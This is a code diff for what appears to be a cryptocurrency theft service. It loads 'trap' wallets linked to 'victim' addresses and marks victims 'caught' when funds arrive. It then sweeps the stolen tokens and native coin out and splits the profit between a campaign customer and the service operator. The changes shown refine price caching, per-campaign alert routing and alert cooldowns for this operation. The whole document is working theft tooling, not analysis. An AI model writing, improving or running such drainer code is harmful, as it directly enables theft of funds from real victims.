@@ -52,20 +52,82 @@ const MIN_TOKEN_SWEEP = BigInt(process.env.MIN_TOKEN_SWEEP || '1000000000000000'
 
 // --- State & Caches ---
 const caughtVictims = new Set();
-const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000;
+const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // 4 hours
 let lastNoBalanceAlertTime = 0;
-const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000;
+const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
 const lastBalanceAlertTimes = new Map(); 
 
 let cycleMetadataCache = null;
 
-// 🚀 HELPER: Send alert to BOTH User (via campaignId) and Admin (global .env)
-async function sendDualAlert(message, type = 'info') {
-  // 1. Send to User
-  if (campaignId) {
-    await sendAlert(message, type, campaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
+// 🚀 FIX: Singleton promise for price fetching to completely prevent 429 API storms
+let priceCache = {};
+let lastPriceFetch = 0;
+let priceFetchPromise = null;
+const PRICE_CACHE_MS = 15 * 60 * 1000; // 15 minutes
+
+async function fetchTokenPrices() {
+  const now = Date.now();
+  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
+    return priceCache;
   }
-  // 2. Send to Admin (omit campaignId to trigger global .env fallback)
+
+  // If a fetch is already in progress, wait for it instead of starting a new one
+  if (priceFetchPromise) {
+    return priceFetchPromise;
+  }
+
+  priceFetchPromise = (async () => {
+    const ids = [nativeSymbol.toLowerCase()];
+    const tokenSymbols = TOKEN_LIST.map(t => t.symbol.toLowerCase());
+    const allSymbols = [...new Set([...ids, ...tokenSymbols])];
+    const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
+
+    try {
+      const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
+      if (coinIds.length === 0) return priceCache;
+      
+      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
+      const resp = await axios.get(url, { timeout: 10000 });
+      
+      if (resp.status === 200) {
+        const data = resp.data;
+        const newCache = {};
+        for (const sym of allSymbols) {
+          const id = symbolToId[sym];
+          if (id && data[id] && data[id].usd) {
+            newCache[sym] = data[id].usd;
+          }
+        }
+        if (Object.keys(newCache).length > 0) {
+          priceCache = newCache;
+          lastPriceFetch = now;
+          logger.debug(`Fetched prices: ${JSON.stringify(priceCache)}`);
+        }
+      }
+    } catch (e) {
+      logger.warn(`Price fetch failed: ${e.message}. Using existing cache if available.`);
+      if (Object.keys(priceCache).length === 0) {
+        logger.error("CRITICAL: No price cache available and fetch failed. Sweeps will use 0 USD value.");
+      }
+    } finally {
+      priceFetchPromise = null; // Clear the promise so future calls can try again after cooldown
+    }
+    return priceCache;
+  })();
+
+  return priceFetchPromise;
+}
+
+// 🚀 FIX: Dual alert function that correctly routes to BOTH User and Admin
+async function sendDualAlert(message, type = 'info', specificCampaignId = null) {
+  const targetCampaignId = specificCampaignId || campaignId;
+  
+  // 1. Send to User (if we have a campaign ID)
+  if (targetCampaignId) {
+    await sendAlert(message, type, targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
+  }
+  
+  // 2. Send to Admin (global config)
   await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
 }
 
@@ -182,7 +244,7 @@ async function loadCaughtVictims() {
 }
 
 // --- Mark victim as caught ---
-async function markVictimCaught(victimAddress) {
+async function markVictimCaught(victimAddress, trapCampaignId = null) {
   if (!victimAddress) return;
   const addr = victimAddress.toLowerCase();
   if (caughtVictims.has(addr)) return;
@@ -191,9 +253,8 @@ async function markVictimCaught(victimAddress) {
   try {
     await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
     
-    // 🚀 DUAL ALERT: Notify both User and Admin of a catch
     const msg = `🎯 Victim caught\nVictim: ${addr}`;
-    await sendDualAlert(msg, 'info');
+    await sendDualAlert(msg, 'info', trapCampaignId || campaignId);
   } catch (err) {
     logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
   }
@@ -211,7 +272,7 @@ switch (chainName) {
   default: viemChain = mainnet;
 }
 
-// --- Load traps from DB (Pre-compute accounts) ---
+// --- Load traps from DB ---
 async function getTrapsFromDB(campaignId = null) {
   if (!supabaseService) return [];
   try {
@@ -237,6 +298,7 @@ async function getTrapsFromDB(campaignId = null) {
           account,
           trapAddress: account.address.toLowerCase(),
           victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
+          campaignId: row.campaign_id, // 🚀 FIX: Restored so we know which user to notify
         });
       } catch (e) {
         logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
@@ -294,46 +356,9 @@ const publicClient = createPublicClient({
   transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
 });
 
-// --- Price fetching with fallback ---
-let priceCache = {};
-let lastPriceFetch = 0;
-const PRICE_CACHE_MS = 5 * 60 * 1000;
-
-async function fetchTokenPrices() {
-  const now = Date.now();
-  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) return priceCache;
-
-  const ids = [nativeSymbol.toLowerCase()];
-  const tokenSymbols = TOKEN_LIST.map(t => t.symbol.toLowerCase());
-  const allSymbols = [...new Set([...ids, ...tokenSymbols])];
-  const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
-
-  try {
-    const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
-    if (coinIds.length === 0) return priceCache;
-    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
-    const resp = await axios.get(url, { timeout: 10000 });
-    if (resp.status === 200) {
-      const data = resp.data;
-      const newCache = {};
-      for (const sym of allSymbols) {
-        const id = symbolToId[sym];
-        if (id && data[id] && data[id].usd) newCache[sym] = data[id].usd;
-      }
-      if (Object.keys(newCache).length > 0) {
-        priceCache = newCache;
-        lastPriceFetch = now;
-      }
-    }
-  } catch (e) {
-    logger.warn(`Price fetch failed: ${e.message}`);
-  }
-  return priceCache;
-}
-
 // 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances, metadata) {
-  const { account, trapAddress, victimAddress } = entry;
+  const { account, trapAddress, victimAddress, campaignId: trapCampaignId } = entry; // 🚀 FIX: Extract trapCampaignId
   const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
   const prices = await fetchTokenPrices();
   const isPriceFeedDown = Object.keys(prices).length === 0;
@@ -366,7 +391,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
     const usdValue = parseFloat(formatted) * tokenPrice;
     const meetsThreshold = isPriceFeedDown ? tokenData.balance >= MIN_TOKEN_SWEEP : usdValue >= MIN_SWEEP_USD;
 
-    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress);
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
     if (!meetsThreshold) continue;
 
     const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
@@ -374,9 +399,8 @@ async function executeSweepForTrap(entry, balances, metadata) {
     if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
       logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
       
-      // 🚀 DUAL ALERT: User gets details, Admin gets a shorter summary
-      await sendAlert(`💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`, 'info', campaignId);
-      await sendAlert(`[ADMIN] 💰 ${token.symbol} detected on trap ${trapAddress} (≈$${usdValue.toFixed(2)})`, 'info');
+      const alertMsg = `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`;
+      await sendDualAlert(alertMsg, 'info', trapCampaignId);
       
       lastBalanceAlertTimes.set(alertKey, now);
     }
@@ -433,14 +457,13 @@ async function executeSweepForTrap(entry, balances, metadata) {
 
       if (userTxHash || serviceTxHash) {
         const txHash = userTxHash || serviceTxHash;
-        if (campaignId && supabaseService) {
-          const txId = await createTransaction(campaignId, trapAddress, token.symbol, formatted, isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
+        if (trapCampaignId && supabaseService) {
+          const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
           if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
         }
         
-        // 🚀 DUAL ALERT for successful sweep
-        await sendAlert(`💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`, 'info', campaignId);
-        await sendAlert(`[ADMIN] 💰 ${token.symbol} swept from ${trapAddress}\nTX: ${txHash}`, 'info');
+        const alertMsg = `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
+        await sendDualAlert(alertMsg, 'info', trapCampaignId);
       }
     } catch (e) {
       logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
@@ -455,7 +478,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
     const usdValue = ethValue * nativePrice;
     const meetsThreshold = isPriceFeedDown ? spendableNativeFinal >= MIN_ETH_SWEEP : usdValue >= MIN_SWEEP_USD;
 
-    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress);
+    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
 
     if (meetsThreshold) {
       try {
@@ -496,14 +519,13 @@ async function executeSweepForTrap(entry, balances, metadata) {
 
           if (userTxHash || serviceTxHash) {
             const txHash = userTxHash || serviceTxHash;
-            if (campaignId && supabaseService) {
-              const txId = await createTransaction(campaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
+            if (trapCampaignId && supabaseService) {
+              const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
               if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
             }
             
-            // 🚀 DUAL ALERT for native sweep
-            await sendAlert(`💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`, 'info', campaignId);
-            await sendAlert(`[ADMIN] 💰 ${nativeSymbol} swept from ${trapAddress}\nTX: ${txHash}`, 'info');
+            const alertMsg = `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
+            await sendDualAlert(alertMsg, 'info', trapCampaignId);
           }
         }
       } catch (e) {
@@ -528,7 +550,7 @@ async function sweepBatch() {
   }
 
   if (entries.length === 0) {
-    await sendDualAlert(`ℹ️ Sweep cycle: No traps found.`, 'info');
+    await sendDualAlert(`ℹ️ Sweep cycle: No traps found.`, 'info', campaignId);
     return;
   }
 
@@ -551,9 +573,8 @@ async function sweepBatch() {
     let anySwept = false;
 
     try {
-      // 🚀 DUAL ALERT: Notify both when a cycle starts
-      await sendDualAlert(`🔄 Sweep cycle started for ${total} traps on ${chainName}.`, 'info');
-
+      // 🚀 FIX: Removed "Sweep cycle started" alert to prevent per-minute spam.
+      
       const CHUNK_SIZE = 20;
       
       for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
@@ -600,14 +621,16 @@ async function sweepBatch() {
         }
       }
       
+      // 🚀 FIX: Strict 4-hour cooldown for "No balances found" alerts
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
-          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${total} traps.`, 'info');
+          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${total} traps.`, 'info', campaignId);
           lastNoBalanceAlertTime = now;
         }
       } else {
-        await sendDualAlert(`✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
+        // Only notify admin on success to avoid spamming users with cycle summaries
+        await sendAlert(`[ADMIN] ✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
       }
     } catch (err) {
       logger.error(`Batch sweep error: ${err.message}`);
@@ -655,7 +678,7 @@ async function sweepSingle(privateKey, destination) {
           trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
         }
       });
-      await executeSweepForTrap({ account, trapAddress, victimAddress: null }, trapBalances, cycleMetadataCache);
+      await executeSweepForTrap({ account, trapAddress, victimAddress: null, campaignId: null }, trapBalances, cycleMetadataCache);
     } catch (err) {
       logger.error(`Sweep error: ${err.message}`);
     } finally {
